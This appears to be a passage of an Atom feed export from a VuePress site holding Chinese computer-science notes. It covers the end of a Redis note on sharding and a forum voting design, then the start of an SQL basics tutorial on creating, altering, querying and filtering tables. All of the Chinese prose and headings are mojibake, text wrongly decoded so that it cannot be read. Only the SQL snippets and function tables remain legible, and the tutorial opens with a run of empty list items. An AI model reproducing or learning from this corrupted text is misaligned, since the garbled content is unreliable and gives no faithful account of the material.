<li>è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å“ˆå¸Œåˆ†ç‰‡ï¼Œä½¿ç”¨ CRC32 å“ˆå¸Œå‡½æ•°å°†é”®è½¬æ¢ä¸ºä¸€ä¸ªæ•°å­—ï¼Œå†å¯¹å®ä¾‹æ•°é‡æ±‚æ¨¡å°±èƒ½çŸ¥é“åº”è¯¥å­˜å‚¨çš„å®ä¾‹ã€‚</li>
</ul>
<p>æ ¹æ®æ‰§è¡Œåˆ†ç‰‡çš„ä½ç½®ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰ç§åˆ†ç‰‡æ–¹å¼ï¼š</p>
<ul>
<li>å®¢æˆ·ç«¯åˆ†ç‰‡ï¼šå®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç­‰ç®—æ³•å†³å®šé”®åº”å½“åˆ†å¸ƒåˆ°å“ªä¸ªèŠ‚ç‚¹ã€‚</li>
<li>ä»£ç†åˆ†ç‰‡ï¼šå°†å®¢æˆ·ç«¯è¯·æ±‚å‘é€åˆ°ä»£ç†ä¸Šï¼Œç”±ä»£ç†è½¬å‘è¯·æ±‚åˆ°æ­£ç¡®çš„èŠ‚ç‚¹ä¸Šã€‚</li>
<li>æœåŠ¡å™¨åˆ†ç‰‡ï¼šRedis Clusterã€‚</li>
</ul>
<h1 id="åä¸‰ã€ä¸€ä¸ªç®€å•çš„è®ºå›ç³»ç»Ÿåˆ†æ" tabindex="-1"> åä¸‰ã€ä¸€ä¸ªç®€å•çš„è®ºå›ç³»ç»Ÿåˆ†æ</h1>
<p>è¯¥è®ºå›ç³»ç»ŸåŠŸèƒ½å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¯ä»¥å‘å¸ƒæ–‡ç« ï¼›</li>
<li>å¯ä»¥å¯¹æ–‡ç« è¿›è¡Œç‚¹èµï¼›</li>
<li>åœ¨é¦–é¡µå¯ä»¥æŒ‰æ–‡ç« çš„å‘å¸ƒæ—¶é—´æˆ–è€…æ–‡ç« çš„ç‚¹èµæ•°è¿›è¡Œæ’åºæ˜¾ç¤ºã€‚</li>
</ul>
<h2 id="æ–‡ç« ä¿¡æ¯" tabindex="-1"> æ–‡ç« ä¿¡æ¯</h2>
<p>æ–‡ç« åŒ…æ‹¬æ ‡é¢˜ã€ä½œè€…ã€èµæ•°ç­‰ä¿¡æ¯ï¼Œåœ¨å…³ç³»å‹æ•°æ®åº“ä¸­å¾ˆå®¹æ˜“æ„å»ºä¸€å¼ è¡¨æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯ï¼Œåœ¨ Redis ä¸­å¯ä»¥ä½¿ç”¨ HASH æ¥å­˜å‚¨æ¯ç§ä¿¡æ¯ä»¥åŠå…¶å¯¹åº”çš„å€¼çš„æ˜ å°„ã€‚</p>
<p>Redis æ²¡æœ‰å…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨è¿™ä¸€æ¦‚å¿µæ¥å°†åŒç§ç±»å‹çš„æ•°æ®å­˜æ”¾åœ¨ä¸€èµ·ï¼Œè€Œæ˜¯ä½¿ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚é”®åçš„å‰é¢éƒ¨åˆ†å­˜å‚¨å‘½åç©ºé—´ï¼Œåé¢éƒ¨åˆ†çš„å†…å®¹å­˜å‚¨ IDï¼Œé€šå¸¸ä½¿ç”¨ : æ¥è¿›è¡Œåˆ†éš”ã€‚ä¾‹å¦‚ä¸‹é¢çš„ HASH çš„é”®åä¸º article:92617ï¼Œå…¶ä¸­ article ä¸ºå‘½åç©ºé—´ï¼ŒID ä¸º 92617ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c54de21-e2ff-402e-bc42-4037de1c1592.png" width="400"/> </div><br>
<h2 id="ç‚¹èµåŠŸèƒ½" tabindex="-1"> ç‚¹èµåŠŸèƒ½</h2>
<p>å½“æœ‰ç”¨æˆ·ä¸ºä¸€ç¯‡æ–‡ç« ç‚¹èµæ—¶ï¼Œé™¤äº†è¦å¯¹è¯¥æ–‡ç« çš„ votes å­—æ®µè¿›è¡ŒåŠ  1 æ“ä½œï¼Œè¿˜å¿…é¡»è®°å½•è¯¥ç”¨æˆ·å·²ç»å¯¹è¯¥æ–‡ç« è¿›è¡Œäº†ç‚¹èµï¼Œé˜²æ­¢ç”¨æˆ·ç‚¹èµæ¬¡æ•°è¶…è¿‡ 1ã€‚å¯ä»¥å»ºç«‹æ–‡ç« çš„å·²æŠ•ç¥¨ç”¨æˆ·é›†åˆæ¥è¿›è¡Œè®°å½•ã€‚</p>
<p>ä¸ºäº†èŠ‚çº¦å†…å­˜ï¼Œè§„å®šä¸€ç¯‡æ–‡ç« å‘å¸ƒæ»¡ä¸€å‘¨ä¹‹åï¼Œå°±ä¸èƒ½å†å¯¹å®ƒè¿›è¡ŒæŠ•ç¥¨ï¼Œè€Œæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆä¹Ÿä¼šè¢«åˆ é™¤ï¼Œå¯ä»¥ä¸ºæ–‡ç« çš„å·²æŠ•ç¥¨é›†åˆè®¾ç½®ä¸€ä¸ªä¸€å‘¨çš„è¿‡æœŸæ—¶é—´å°±èƒ½å®ç°è¿™ä¸ªè§„å®šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/485fdf34-ccf8-4185-97c6-17374ee719a0.png" width="400"/> </div><br>
<h2 id="å¯¹æ–‡ç« è¿›è¡Œæ’åº" tabindex="-1"> å¯¹æ–‡ç« è¿›è¡Œæ’åº</h2>
<p>ä¸ºäº†æŒ‰å‘å¸ƒæ—¶é—´å’Œç‚¹èµæ•°è¿›è¡Œæ’åºï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ–‡ç« å‘å¸ƒæ—¶é—´çš„æœ‰åºé›†åˆå’Œä¸€ä¸ªæ–‡ç« ç‚¹èµæ•°çš„æœ‰åºé›†åˆã€‚ï¼ˆä¸‹å›¾ä¸­çš„ score å°±æ˜¯è¿™é‡Œæ‰€è¯´çš„ç‚¹èµæ•°ï¼›ä¸‹é¢æ‰€ç¤ºçš„æœ‰åºé›†åˆåˆ†å€¼å¹¶ä¸ç›´æ¥æ˜¯æ—¶é—´å’Œç‚¹èµæ•°ï¼Œè€Œæ˜¯æ ¹æ®æ—¶é—´å’Œç‚¹èµæ•°é—´æ¥è®¡ç®—å‡ºæ¥çš„ï¼‰</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f7d170a3-e446-4a64-ac2d-cb95028f81a8.png" width="800"/> </div>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013.</li>
<li><a href="http://redisbook.com/index.html" target="_blank" rel="noopener noreferrer">é»„å¥å®. Redis è®¾è®¡ä¸å®ç° [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2014.</a></li>
<li><a href="https://redislabs.com/ebook/foreword/" target="_blank" rel="noopener noreferrer">REDIS IN ACTION</a></li>
<li><a href="http://ticki.github.io/blog/skip-lists-done-right/" target="_blank" rel="noopener noreferrer">Skip Lists: Done Right</a></li>
<li><a href="http://www.cnblogs.com/loveincode/p/7411911.html" target="_blank" rel="noopener noreferrer">è®ºè¿° Redis å’Œ Memcached çš„å·®å¼‚</a></li>
<li><a href="http://wiki.jikexueyuan.com/project/redis-guide" target="_blank" rel="noopener noreferrer">Redis 3.0 ä¸­æ–‡ç‰ˆ- åˆ†ç‰‡</a></li>
<li><a href="http://www.scienjus.com/redis-use-case/" target="_blank" rel="noopener noreferrer">Redis åº”ç”¨åœºæ™¯</a></li>
<li><a href="https://redis.io/topics/lru-cache" target="_blank" rel="noopener noreferrer">Using Redis as an LRU cache</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">SQL</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>

<h1 id="ä¸€ã€åŸºç¡€" tabindex="-1"> ä¸€ã€åŸºç¡€</h1>
<p>æ¨¡å¼å®šä¹‰äº†æ•°æ®å¦‚ä½•å­˜å‚¨ã€å­˜å‚¨ä»€ä¹ˆæ ·çš„æ•°æ®ä»¥åŠæ•°æ®å¦‚ä½•åˆ†è§£ç­‰ä¿¡æ¯ï¼Œæ•°æ®åº“å’Œè¡¨éƒ½æœ‰æ¨¡å¼ã€‚</p>
<p>ä¸»é”®çš„å€¼ä¸å…è®¸ä¿®æ”¹ï¼Œä¹Ÿä¸å…è®¸å¤ç”¨ï¼ˆä¸èƒ½å°†å·²ç»åˆ é™¤çš„ä¸»é”®å€¼èµ‹ç»™æ–°æ•°æ®è¡Œçš„ä¸»é”®ï¼‰ã€‚</p>
<p>SQLï¼ˆStructured Query Language)ï¼Œæ ‡å‡† SQL ç”± ANSI æ ‡å‡†å§”å‘˜ä¼šç®¡ç†ï¼Œä»è€Œç§°ä¸º ANSI SQLã€‚å„ä¸ª DBMS éƒ½æœ‰è‡ªå·±çš„å®ç°ï¼Œå¦‚ PL/SQLã€Transact-SQL ç­‰ã€‚</p>
<p>SQL è¯­å¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯æ•°æ®åº“è¡¨åã€åˆ—åå’Œå€¼æ˜¯å¦åŒºåˆ†ä¾èµ–äºå…·ä½“çš„ DBMS ä»¥åŠé…ç½®ã€‚</p>
<p>SQL æ”¯æŒä»¥ä¸‹ä¸‰ç§æ³¨é‡Šï¼š</p>
<div><pre><code><span># æ³¨é‡Š</span>
<span>SELECT</span> <span>*</span>
<span>FROM</span> mytable<span>;</span> <span>-- æ³¨é‡Š</span>
<span>/* æ³¨é‡Š1
   æ³¨é‡Š2 */</span>
</code></pre></div><p>æ•°æ®åº“åˆ›å»ºä¸ä½¿ç”¨ï¼š</p>
<div><pre><code><span>CREATE</span> <span>DATABASE</span> test<span>;</span>
<span>USE</span> test<span>;</span>
</code></pre></div><h1 id="äºŒã€åˆ›å»ºè¡¨" tabindex="-1"> äºŒã€åˆ›å»ºè¡¨</h1>
<div><pre><code><span>CREATE</span> <span>TABLE</span> mytable <span>(</span>
  <span># int ç±»å‹ï¼Œä¸ä¸ºç©ºï¼Œè‡ªå¢</span>
  id <span>INT</span> <span>NOT</span> <span>NULL</span> <span>AUTO_INCREMENT</span><span>,</span>
  <span># int ç±»å‹ï¼Œä¸å¯ä¸ºç©ºï¼Œé»˜è®¤å€¼ä¸º 1ï¼Œä¸ä¸ºç©º</span>
  col1 <span>INT</span> <span>NOT</span> <span>NULL</span> <span>DEFAULT</span> <span>1</span><span>,</span>
  <span># å˜é•¿å­—ç¬¦ä¸²ç±»å‹ï¼Œæœ€é•¿ä¸º 45 ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸ºç©º</span>
  col2 <span>VARCHAR</span><span>(</span><span>45</span><span>)</span> <span>NULL</span><span>,</span>
  <span># æ—¥æœŸç±»å‹ï¼Œå¯ä¸ºç©º</span>
  col3 <span>DATE</span> <span>NULL</span><span>,</span>
  <span># è®¾ç½®ä¸»é”®ä¸º id</span>
  <span>PRIMARY</span> <span>KEY</span> <span>(</span><span><span>`</span>id<span>`</span></span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h1 id="ä¸‰ã€ä¿®æ”¹è¡¨" tabindex="-1"> ä¸‰ã€ä¿®æ”¹è¡¨</h1>
<p>æ·»åŠ åˆ—</p>
<div><pre><code><span>ALTER</span> <span>TABLE</span> mytable
<span>ADD</span> col <span>CHAR</span><span>(</span><span>20</span><span>)</span><span>;</span>
</code></pre></div><p>åˆ é™¤åˆ—</p>
<div><pre><code><span>ALTER</span> <span>TABLE</span> mytable
<span>DROP</span> <span>COLUMN</span> col<span>;</span>
</code></pre></div><p>åˆ é™¤è¡¨</p>
<div><pre><code><span>DROP</span> <span>TABLE</span> mytable<span>;</span>
</code></pre></div><h1 id="å››ã€æ’å…¥" tabindex="-1"> å››ã€æ’å…¥</h1>
<p>æ™®é€šæ’å…¥</p>
<div><pre><code><span>INSERT</span> <span>INTO</span> mytable<span>(</span>col1<span>,</span> col2<span>)</span>
<span>VALUES</span><span>(</span>val1<span>,</span> val2<span>)</span><span>;</span>
</code></pre></div><p>æ’å…¥æ£€ç´¢å‡ºæ¥çš„æ•°æ®</p>
<div><pre><code><span>INSERT</span> <span>INTO</span> mytable1<span>(</span>col1<span>,</span> col2<span>)</span>
<span>SELECT</span> col1<span>,</span> col2
<span>FROM</span> mytable2<span>;</span>
</code></pre></div><p>å°†ä¸€ä¸ªè¡¨çš„å†…å®¹æ’å…¥åˆ°ä¸€ä¸ªæ–°è¡¨</p>
<div><pre><code><span>CREATE</span> <span>TABLE</span> newtable <span>AS</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> mytable<span>;</span>
</code></pre></div><h1 id="äº”ã€æ›´æ–°" tabindex="-1"> äº”ã€æ›´æ–°</h1>
<div><pre><code><span>UPDATE</span> mytable
<span>SET</span> col <span>=</span> val
<span>WHERE</span> id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><h1 id="å…­ã€åˆ é™¤" tabindex="-1"> å…­ã€åˆ é™¤</h1>
<div><pre><code><span>DELETE</span> <span>FROM</span> mytable
<span>WHERE</span> id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><p><strong>TRUNCATE TABLE</strong>  å¯ä»¥æ¸…ç©ºè¡¨ï¼Œä¹Ÿå°±æ˜¯åˆ é™¤æ‰€æœ‰è¡Œã€‚</p>
<div><pre><code><span>TRUNCATE</span> <span>TABLE</span> mytable<span>;</span>
</code></pre></div><p>ä½¿ç”¨æ›´æ–°å’Œåˆ é™¤æ“ä½œæ—¶ä¸€å®šè¦ç”¨ WHERE å­å¥ï¼Œä¸ç„¶ä¼šæŠŠæ•´å¼ è¡¨çš„æ•°æ®éƒ½ç ´åã€‚å¯ä»¥å…ˆç”¨ SELECT è¯­å¥è¿›è¡Œæµ‹è¯•ï¼Œé˜²æ­¢é”™è¯¯åˆ é™¤ã€‚</p>
<h1 id="ä¸ƒã€æŸ¥è¯¢" tabindex="-1"> ä¸ƒã€æŸ¥è¯¢</h1>
<h2 id="distinct" tabindex="-1"> DISTINCT</h2>
<p>ç›¸åŒå€¼åªä¼šå‡ºç°ä¸€æ¬¡ã€‚å®ƒä½œç”¨äºæ‰€æœ‰åˆ—ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰åˆ—çš„å€¼éƒ½ç›¸åŒæ‰ç®—ç›¸åŒã€‚</p>
<div><pre><code><span>SELECT</span> <span>DISTINCT</span> col1<span>,</span> col2
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h2 id="limit" tabindex="-1"> LIMIT</h2>
<p>é™åˆ¶è¿”å›çš„è¡Œæ•°ã€‚å¯ä»¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºèµ·å§‹è¡Œï¼Œä» 0 å¼€å§‹ï¼›ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿”å›çš„æ€»è¡Œæ•°ã€‚</p>
<p>è¿”å›å‰ 5 è¡Œï¼š</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>5</span><span>;</span>
</code></pre></div><div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>0</span><span>,</span> <span>5</span><span>;</span>
</code></pre></div><p>è¿”å›ç¬¬ 3 ~ 5 è¡Œï¼š</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>LIMIT</span> <span>2</span><span>,</span> <span>3</span><span>;</span>
</code></pre></div><h1 id="å…«ã€æ’åº" tabindex="-1"> å…«ã€æ’åº</h1>
<ul>
<li><strong>ASC</strong> ï¼šå‡åºï¼ˆé»˜è®¤ï¼‰</li>
<li><strong>DESC</strong> ï¼šé™åº</li>
</ul>
<p>å¯ä»¥æŒ‰å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªåˆ—æŒ‡å®šä¸åŒçš„æ’åºæ–¹å¼ï¼š</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>ORDER</span> <span>BY</span> col1 <span>DESC</span><span>,</span> col2 <span>ASC</span><span>;</span>
</code></pre></div><h1 id="ä¹ã€è¿‡æ»¤" tabindex="-1"> ä¹ã€è¿‡æ»¤</h1>
<p>ä¸è¿›è¡Œè¿‡æ»¤çš„æ•°æ®éå¸¸å¤§ï¼Œå¯¼è‡´é€šè¿‡ç½‘ç»œä¼ è¾“äº†å¤šä½™çš„æ•°æ®ï¼Œä»è€Œæµªè´¹äº†ç½‘ç»œå¸¦å®½ã€‚å› æ­¤å°½é‡ä½¿ç”¨ SQL è¯­å¥æ¥è¿‡æ»¤ä¸å¿…è¦çš„æ•°æ®ï¼Œè€Œä¸æ˜¯ä¼ è¾“æ‰€æœ‰çš„æ•°æ®åˆ°å®¢æˆ·ç«¯ä¸­ç„¶åç”±å®¢æˆ·ç«¯è¿›è¡Œè¿‡æ»¤ã€‚</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> col <span>IS</span> <span>NULL</span><span>;</span>
</code></pre></div><p>ä¸‹è¡¨æ˜¾ç¤ºäº† WHERE å­å¥å¯ç”¨çš„æ“ä½œç¬¦</p>
<table>
<thead>
<tr>
<th style="text-align:center">æ“ä½œç¬¦</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">ç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">å°äº</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">å¤§äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;&gt; !=</td>
<td style="text-align:center">ä¸ç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&lt;= !&gt;</td>
<td style="text-align:center">å°äºç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">&gt;= !&lt;</td>
<td style="text-align:center">å¤§äºç­‰äº</td>
</tr>
<tr>
<td style="text-align:center">BETWEEN</td>
<td style="text-align:center">åœ¨ä¸¤ä¸ªå€¼ä¹‹é—´</td>
</tr>
<tr>
<td style="text-align:center">IS NULL</td>
<td style="text-align:center">ä¸º NULL å€¼</td>
</tr>
</tbody>
</table>
<p>åº”è¯¥æ³¨æ„åˆ°ï¼ŒNULL ä¸ 0ã€ç©ºå­—ç¬¦ä¸²éƒ½ä¸åŒã€‚</p>
<p><strong>AND å’Œ OR</strong>  ç”¨äºè¿æ¥å¤šä¸ªè¿‡æ»¤æ¡ä»¶ã€‚ä¼˜å…ˆå¤„ç† ANDï¼Œå½“ä¸€ä¸ªè¿‡æ»¤è¡¨è¾¾å¼æ¶‰åŠåˆ°å¤šä¸ª AND å’Œ OR æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ () æ¥å†³å®šä¼˜å…ˆçº§ï¼Œä½¿å¾—ä¼˜å…ˆçº§å…³ç³»æ›´æ¸…æ™°ã€‚</p>
<p><strong>IN</strong>  æ“ä½œç¬¦ç”¨äºåŒ¹é…ä¸€ç»„å€¼ï¼Œå…¶åä¹Ÿå¯ä»¥æ¥ä¸€ä¸ª SELECT å­å¥ï¼Œä»è€ŒåŒ¹é…å­æŸ¥è¯¢å¾—åˆ°çš„ä¸€ç»„å€¼ã€‚</p>
<p><strong>NOT</strong>  æ“ä½œç¬¦ç”¨äºå¦å®šä¸€ä¸ªæ¡ä»¶ã€‚</p>
<h1 id="åã€é€šé…ç¬¦" tabindex="-1"> åã€é€šé…ç¬¦</h1>
<p>é€šé…ç¬¦ä¹Ÿæ˜¯ç”¨åœ¨è¿‡æ»¤è¯­å¥ä¸­ï¼Œä½†å®ƒåªèƒ½ç”¨äºæ–‡æœ¬å­—æ®µã€‚</p>
<ul>
<li>
<p><strong>%</strong>  åŒ¹é… &gt;=0 ä¸ªä»»æ„å­—ç¬¦ï¼›</p>
</li>
<li>
<p><strong>_</strong>  åŒ¹é… ==1 ä¸ªä»»æ„å­—ç¬¦ï¼›</p>
</li>
<li>
<p><strong>[ ]</strong>  å¯ä»¥åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ï¼Œä¾‹å¦‚ [ab] å°†åŒ¹é…å­—ç¬¦ a æˆ–è€… bã€‚ç”¨è„±å­—ç¬¦ ^ å¯ä»¥å¯¹å…¶è¿›è¡Œå¦å®šï¼Œä¹Ÿå°±æ˜¯ä¸åŒ¹é…é›†åˆå†…çš„å­—ç¬¦ã€‚</p>
</li>
</ul>
<p>ä½¿ç”¨ Like æ¥è¿›è¡Œé€šé…ç¬¦åŒ¹é…ã€‚</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> col <span>LIKE</span> <span>'[^AB]%'</span><span>;</span> <span>-- ä¸ä»¥ A å’Œ B å¼€å¤´çš„ä»»æ„æ–‡æœ¬</span>
</code></pre></div><p>ä¸è¦æ»¥ç”¨é€šé…ç¬¦ï¼Œé€šé…ç¬¦ä½äºå¼€å¤´å¤„åŒ¹é…ä¼šéå¸¸æ…¢ã€‚</p>
<h1 id="åä¸€ã€è®¡ç®—å­—æ®µ" tabindex="-1"> åä¸€ã€è®¡ç®—å­—æ®µ</h1>
<p>åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šå®Œæˆæ•°æ®çš„è½¬æ¢å’Œæ ¼å¼åŒ–çš„å·¥ä½œå¾€å¾€æ¯”å®¢æˆ·ç«¯ä¸Šå¿«å¾—å¤šï¼Œå¹¶ä¸”è½¬æ¢å’Œæ ¼å¼åŒ–åçš„æ•°æ®é‡æ›´å°‘çš„è¯å¯ä»¥å‡å°‘ç½‘ç»œé€šä¿¡é‡ã€‚</p>
<p>è®¡ç®—å­—æ®µé€šå¸¸éœ€è¦ä½¿ç”¨  <strong>AS</strong>  æ¥å–åˆ«åï¼Œå¦åˆ™è¾“å‡ºçš„æ—¶å€™å­—æ®µåä¸ºè®¡ç®—è¡¨è¾¾å¼ã€‚</p>
<div><pre><code><span>SELECT</span> col1 <span>*</span> col2 <span>AS</span> alias
<span>FROM</span> mytable<span>;</span>
</code></pre></div><p><strong>CONCAT()</strong>  ç”¨äºè¿æ¥ä¸¤ä¸ªå­—æ®µã€‚è®¸å¤šæ•°æ®åº“ä¼šä½¿ç”¨ç©ºæ ¼æŠŠä¸€ä¸ªå€¼å¡«å……ä¸ºåˆ—å®½ï¼Œå› æ­¤è¿æ¥çš„ç»“æœä¼šå‡ºç°ä¸€äº›ä¸å¿…è¦çš„ç©ºæ ¼ï¼Œä½¿ç”¨ <strong>TRIM()</strong> å¯ä»¥å»é™¤é¦–å°¾ç©ºæ ¼ã€‚</p>
<div><pre><code><span>SELECT</span> CONCAT<span>(</span>TRIM<span>(</span>col1<span>)</span><span>,</span> <span>'('</span><span>,</span> TRIM<span>(</span>col2<span>)</span><span>,</span> <span>')'</span><span>)</span> <span>AS</span> concat_col
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h1 id="åäºŒã€å‡½æ•°" tabindex="-1"> åäºŒã€å‡½æ•°</h1>
<p>å„ä¸ª DBMS çš„å‡½æ•°éƒ½æ˜¯ä¸ç›¸åŒçš„ï¼Œå› æ­¤ä¸å¯ç§»æ¤ï¼Œä»¥ä¸‹ä¸»è¦æ˜¯ MySQL çš„å‡½æ•°ã€‚</p>
<h2 id="æ±‡æ€»" tabindex="-1"> æ±‡æ€»</h2>
<table>
<thead>
<tr>
<th style="text-align:center">å‡½ æ•°</th>
<th style="text-align:center">è¯´ æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">AVG()</td>
<td style="text-align:center">è¿”å›æŸåˆ—çš„å¹³å‡å€¼</td>
</tr>
<tr>
<td style="text-align:center">COUNT()</td>
<td style="text-align:center">è¿”å›æŸåˆ—çš„è¡Œæ•°</td>
</tr>
<tr>
<td style="text-align:center">MAX()</td>
<td style="text-align:center">è¿”å›æŸåˆ—çš„æœ€å¤§å€¼</td>
</tr>
<tr>
<td style="text-align:center">MIN()</td>
<td style="text-align:center">è¿”å›æŸåˆ—çš„æœ€å°å€¼</td>
</tr>
<tr>
<td style="text-align:center">SUM()</td>
<td style="text-align:center">è¿”å›æŸåˆ—å€¼ä¹‹å’Œ</td>
</tr>
</tbody>
</table>
<p>AVG() ä¼šå¿½ç•¥ NULL è¡Œã€‚</p>
<p>ä½¿ç”¨ DISTINCT å¯ä»¥æ±‡æ€»ä¸åŒçš„å€¼ã€‚</p>
<div><pre><code><span>SELECT</span> <span>AVG</span><span>(</span><span>DISTINCT</span> col1<span>)</span> <span>AS</span> avg_col
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h2 id="æ–‡æœ¬å¤„ç†" tabindex="-1"> æ–‡æœ¬å¤„ç†</h2>
<table>
<thead>
<tr>
<th style="text-align:center">å‡½æ•°</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">LEFT()</td>
<td style="text-align:center">å·¦è¾¹çš„å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">RIGHT()</td>
<td style="text-align:center">å³è¾¹çš„å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">LOWER()</td>
<td style="text-align:center">è½¬æ¢ä¸ºå°å†™å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">UPPER()</td>
<td style="text-align:center">è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦</td>
</tr>
<tr>
<td style="text-align:center">LTRIM()</td>
<td style="text-align:center">å»é™¤å·¦è¾¹çš„ç©ºæ ¼</td>
</tr>
<tr>
<td style="text-align:center">RTRIM()</td>
<td style="text-align:center">å»é™¤å³è¾¹çš„ç©ºæ ¼</td>
</tr>
<tr>
<td style="text-align:center">LENGTH()</td>
<td style="text-align:center">é•¿åº¦</td>
</tr>
<tr>
<td style="text-align:center">SOUNDEX()</td>
<td style="text-align:center">è½¬æ¢ä¸ºè¯­éŸ³å€¼</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­ï¼Œ <strong>SOUNDEX()</strong>  å¯ä»¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºæè¿°å…¶è¯­éŸ³è¡¨ç¤ºçš„å­—æ¯æ•°å­—æ¨¡å¼ã€‚</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> SOUNDEX<span>(</span>col1<span>)</span> <span>=</span> SOUNDEX<span>(</span><span>'apple'</span><span>)</span>
</code></pre></div><h2 id="æ—¥æœŸå’Œæ—¶é—´å¤„ç†" tabindex="-1"> æ—¥æœŸå’Œæ—¶é—´å¤„ç†</h2>
<ul>
<li>æ—¥æœŸæ ¼å¼ï¼šYYYY-MM-DD</li>
<li>æ—¶é—´æ ¼å¼ï¼šHH:MM:SS</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">å‡½ æ•°</th>
<th style="text-align:center">è¯´ æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ADDDATE()</td>
<td style="text-align:center">å¢åŠ ä¸€ä¸ªæ—¥æœŸï¼ˆå¤©ã€å‘¨ç­‰ï¼‰</td>
</tr>
<tr>
<td style="text-align:center">ADDTIME()</td>
<td style="text-align:center">å¢åŠ ä¸€ä¸ªæ—¶é—´ï¼ˆæ—¶ã€åˆ†ç­‰ï¼‰</td>
</tr>
<tr>
<td style="text-align:center">CURDATE()</td>
<td style="text-align:center">è¿”å›å½“å‰æ—¥æœŸ</td>
</tr>
<tr>
<td style="text-align:center">CURTIME()</td>
<td style="text-align:center">è¿”å›å½“å‰æ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">DATE()</td>
<td style="text-align:center">è¿”å›æ—¥æœŸæ—¶é—´çš„æ—¥æœŸéƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">DATEDIFF()</td>
<td style="text-align:center">è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹å·®</td>
</tr>
<tr>
<td style="text-align:center">DATE_ADD()</td>
<td style="text-align:center">é«˜åº¦çµæ´»çš„æ—¥æœŸè¿ç®—å‡½æ•°</td>
</tr>
<tr>
<td style="text-align:center">DATE_FORMAT()</td>
